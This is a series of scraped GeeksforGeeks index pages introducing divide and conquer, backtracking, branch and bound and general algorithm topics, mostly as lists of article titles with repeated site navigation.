increase the LCS by one Traversal of tree with k jumps allowed between nodes of same height Find all combinations of k-bit numbers with n bits set where 1 <= n <= k in sorted order Quick Links : Top 20 Dynamic Programming Interview Questions ‘Practice Problems’ on Dynamic Programming ‘Quiz’ on Dynamic Programming If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Divide and Conquer - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Divide and Conquer Divide and Conquer is an algorithmic paradigm. A typical Divide and Conquer algorithm solves a problem using following three steps. Divide: Break the given problem into subproblems of same type. Conquer: Recursively solve these subproblems Combine: Appropriately combine the answers A classic example of Divide and Conquer is Merge Sort demonstrated below. In Merge Sort, we divide array into two halves, sort the two halves recursively, and then merge the sorted halves. Recent Articles on Divide and Conquer Topics : Standard Algorithms Binary Search Based Misc Quick Links Standard Algorithms : Intoduction to Divide and Conquer Binary Search Randomized Binary Search Algorithm Merge Sort Quick Sort Tiling Problem Count Inversions Calculate pow(x, n) Closest Pair of Points Closest Pair of Points | O(nlogn) Implementation Multiply two polynomials Strassen’s Matrix Multiplication The Skyline Problem Maximum Subarray Sum Longest Common Prefix Search in a Row-wise and Column-wise Sorted 2D Array Karatsuba algorithm for fast multiplication Convex Hull (Simple Divide and Conquer Algorithm) Quickhull Algorithm for Convex Hull Distinct elements in subarray using Mo’s Algorithm Binary Search Based : Median of two sorted arrays Median of two sorted arrays of different sizes Floor in a Sorted Array Find closest number in array Find a Fixed Point in a given arrray Find a peak element in a given array Check for Majority Element in a sorted array K-th Element of Two Sorted Arrays Find the Rotation Count in Rotated Sorted array Find the minimum element in a sorted and rotated array Find the only repeating element in a sorted array of size n Find index of an extra element present in one sorted array Find the element that appears once in a sorted array Count number of occurrences (or frequency) in a sorted array Find the maximum element in an array which is first increasing and then decreasing Decrease and Conquer Binary Search using pthread Binary Search on Singly Linked List The painter’s partition problem The painter’s partition problem | Set 2 Find the number of zeroes Numbers whose factorials end with n zeros Find the missing number in Arithmetic Progression Number of days after which tank will become empty Find bitonic point in given bitonic sequence Find the point where a monotonically increasing function becomes positive first time Misc : Iterative Tower of Hanoi Program for Tower of Hanoi Square root of an integer Find cubic root of a number Allocate minimum number of pages Collect all coins in minimum number of steps Modular Exponentiation (Power in Modular Arithmetic) Find a peak element in a 2D array Program to count number of set bits in an (big) array Maximum and minimum of an array using minimum number of comparisons Find frequency of each element in a limited range array in less than O(n) time Minimum difference between adjacent elements of array which contain elements from each row of a matrix Search element in a sorted matrix Easy way to remember Strassen’s Matrix Equation Largest Rectangular Area in a Histogram | Set 1 Advanced master theorem for divide and conquer recurrences Place k elements such that minimum distance is maximized Iterative Fast Fourier Transformation for polynomial multiplication Write you own Power without using multiplication(*) and division(/) operators Sequences of given length where every element is more than or equal to twice of previous Shuffle 2n integers in format {a1, b1, a2, b2, a3, b3, ……, an, bn} without using extra space Quick Links : ‘Practice Problems’ on Divide and Conquer ‘Quizzes’ on Divide and Conquer If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Backtracking Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Backtracking Algorithms Backtracking is an algorithmic-technique for solving problems recursively by trying to build a solution incrementally, one piece at a time, removing those solutions that fail to satisfy the constraints of the problem at any point of time (by time, here, is referred to the time elapsed till reaching any level of the search tree). For example, consider the SudoKo solving Problem, we try filling digits one by one. Whenever we find that current digit cannot lead to a solution, we remove it (backtrack) and try next digit. This is better than naive approach (generating all possible combinations of digits and then trying every combination one by one) as it drops a set of permutations whenever it backtracks. Recent Articles on Backtracking Topics : Standard Problems Misc Quick Links Standard Problems : Backtracking | Set 1 (The Knight’s tour problem) Backtracking | Set 2 (Rat in a Maze) Backtracking | Set 3 (N Queen Problem) Backtracking | Set 4 (Subset Sum) Backtracking | Set 5 (m Coloring Problem) Backtracking | Set 6 (Hamiltonian Cycle) Backtracking | Set 7 (Sudoku) Backtracking | Set 8 (Solving Cryptarithmetic Puzzles) Backtracking | Set 9 (Magnet Puzzle) N Queen in O(n) space Boggle | Set 2 (Using Trie) Remove Invalid Parentheses Prime numbers after prime P with sum S Rat in a Maze with multiple steps or jump allowed A backtracking approach to generate n bit Gray Codes C++ program for Solving Cryptarithmetic Puzzles Write a program to print all permutations of a given string Print all possible paths from top left to bottom right of a mXn matrix Misc : Tug of War 8 queen problem Combinational Sum Backtracking to find all subsets Power Set in Lexicographic order Check if a given string is sum-string Fill 8 numbers in grid with given conditions Word Break Problem using Backtracking Minimize number of unique characters in string Count all possible paths between two vertices Partition of a set into K subsets with equal sum Warnsdorff’s algorithm for Knight’s tour problem Longest Possible Route in a Matrix with Hurdles Match a pattern and String without using regular expressions Fill two instances of all numbers from 1 to n in a specific way Find all distinct subsets of a given set Find shortest safe route in a path with landmines Find paths from corner cell to middle cell in maze Find if there is a path of more than k length from a source Find Maximum number possible by doing at-most K swaps Print all palindromic partitions of a string Printing all solutions in N-Queen Problem Print all paths from a given source to a destination Print all possible strings that can be made by placing spaces| Set-1 Print all possible strings that can be made by placing spaces| Set-2 Print all longest common sub-sequences in lexicographical order Smallest expression to represent a number using single digit Given an array A[] and a number x, check for pair in A[] with sum as x Combinations where every element appears twice and distance between appearances is equal to the value Quick Links : Top 20 Backtracking Algorithm Interview Questions ‘Practice Problems’ on Backtracking ‘Quiz’ on Backtracking ‘Videos’ on Backtracking If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Branch and Bound Algorithm - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Branch and Bound Algorithm Branch and bound is an algorithm design paradigm which is generally used for solving combinatorial optimization problems. These problems are typically exponential in terms of time complexity and may require exploring all possible permutations in worst case. The Branch and Bound Algorithm technique solves these problems relatively quickly. Let us consider the 0/1 Knapsack problem to understand Branch and Bound. There are many algorithms by which the knapsack problem can be solved: Greedy Algorithm for Fractional Knapsack DP solution for 0/1 Knapsack Backtracking Solution for 0/1 Knapsack. Let’s see the Branch and Bound Approach to solve the 0/1 Knapsack problem: The Backtracking Solution can be optimized if we know a bound on best possible solution subtree rooted with every node. If the best in subtree is worse than current best, we can simply ignore this node and its subtrees. So we compute bound (best solution) for every node and compare the bound with current best solution before exploring the node. Example bounds used in below diagram are, A down can give $315, B down can $275, C down can $225, D down can $125 and E down can $30. Recent Articles on Branch and Bound Branch and Bound | Set 1 (Introduction with 0/1 Knapsack) Branch and Bound | Set 2 (Implementation of 0/1 Knapsack) Branch and Bound | Set 3 (8 puzzle Problem) Branch And Bound | Set 4 (Job Assignment Problem) Branch and Bound | Set 5 (N Queen Problem) Branch And Bound | Set 6 (Traveling Salesman Problem) If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Algorithms Topics : Analysis of Algorithms Searching and Sorting Greedy Algorithms Dynamic Programming Pattern Searching Other String Algorithms Backtracking Divide and Conquer Geometric Algorithms Mathematical Algorithms Bit Algorithms Graph Algorithms Randomized Algorithms Branch and Bound Quizzes on Algorithms Misc Analysis of Algorithms: Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does ‘Space Complexity’ mean? Pseudo-polynomial Algorithms NP-Completeness Introduction Polynomial Time Approximation Scheme A Time Complexity Question Time Complexity of building a heap Time Complexity where loop variable is incremented by 1, 2, 3, 4 .. Time Complexity of Loop with Powers Performance of loops (A caching question) Recent Articles on Analysis of Algorithms Quiz on Analysis of Algorithms Quiz on Recurrences Searching and Sorting: Linear Search, Binary Search, Jump Search, Interpolation Search, Exponential Search, Ternary Search Selection Sort, Bubble Sort, Insertion Sort, Merge Sort, Heap Sort, QuickSort, Radix Sort, Counting Sort, Bucket Sort, ShellSort, Comb Sort, Pigeonhole Sort, Cycle Sort Interpolation search vs Binary search Stability in sorting algorithms When does the worst case of Quicksort occur? Lower bound for comparison based sorting algorithms Which sorting algorithm makes minimum number of memory writes? Find the Minimum length Unsorted Subarray, sorting which makes the complete array sorted Merge Sort for Linked Lists Sort a nearly sorted (or K sorted) array Iterative Quick Sort QuickSort on Singly Linked List QuickSort on Doubly Linked List Find k closest elements to a given value Sort n numbers in range from 0 to n^2 – 1 in linear time A Problem in Many Binary Search Implementations Search in an almost sorted array Sort an array in wave form Why is Binary Search preferred over Ternary Search? K’th Smallest/Largest Element in Unsorted Array K’th Smallest/Largest Element in Unsorted Array in Expected Linear Time K’th Smallest/Largest Element in Unsorted Array in Worst Case Linear Time Find the closest pair from two sorted arrays Find common elements in three sorted arrays Given a sorted array and a number x, find the pair in array whose sum is closest to x Count 1’s in a sorted binary array Binary Insertion Sort Insertion Sort for Singly Linked List Why Quick Sort preferred for Arrays and Merge Sort for Linked Lists? Merge Sort for Doubly Linked List Minimum adjacent swaps to move maximum and minimum to corners Recent Articles on Searching Recent Articles on Sorting Quiz on Searching Quiz on Sorting Coding Practice on Searching Coding Practice on Sorting Greedy 